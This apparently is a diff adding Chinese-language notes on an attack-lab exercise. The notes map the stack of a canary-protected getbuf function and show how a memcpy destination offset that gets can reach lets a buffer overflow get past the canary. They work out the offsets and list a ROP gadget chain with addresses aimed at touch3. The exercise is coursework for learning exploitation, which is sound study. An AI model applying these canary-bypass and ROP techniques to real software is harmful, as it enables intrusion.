@@ -1,0 +1,31 @@
+栈的分布：
+ret getbuf_withcanary
+%rbp （用于leave时恢复rsp）   <- 旧的rsp指向的位置
+%fs:0x28 （金丝雀）
+
+
+a(最初设为0)|       <- 旧rsp-0x1c
+...
+cookie
+touch3                      <- ROP的结束结点 (旧rsp-0x58)
+...   ROP           
+                            <- buf的开始结点 (旧rsp-0xa0)
+...
+                            <- rsp指向的位置 (旧rsp-0x120)
+ret memcpy
+
+仔细阅读getbuf_withcanary的汇编，会发现一点儿蹊跷，在将rax设为0的时候，代码费尽心思的把$0放进了危险的gets能够绕过canary触碰到的位置，
+然后再从这个位置取数去设rax，而后续的rax用于规定拷贝一串字符的目的地，具体为：
+memcpy(rsp+a, buf, 0x80)
+         D     S     n              作用为：从S处cpy n个字符至D
+根据栈的排布，我们只需要令a=0x128,就可以让buf从第一个字节开始旧使用攻击的机器码，
+且计算可得0xa0-0x1c=0x84，即16行多四个字节
+攻击的逻辑其实和phase5基本一致：
+movq %rsp, %rax 0x401ef1
+movq %rax, %rdi 0x401e5e
+popq %rax 0x401e75
+movl %eax, %edx 0x401fb8
+movl %edx, %ecx 0x401fce
+movl %ecx, %esi 0x401fe4
+leaq (%rdi, %rsi, 1), %rax 0x401eb0 
+movq %rax, %rdi 0x401e5e
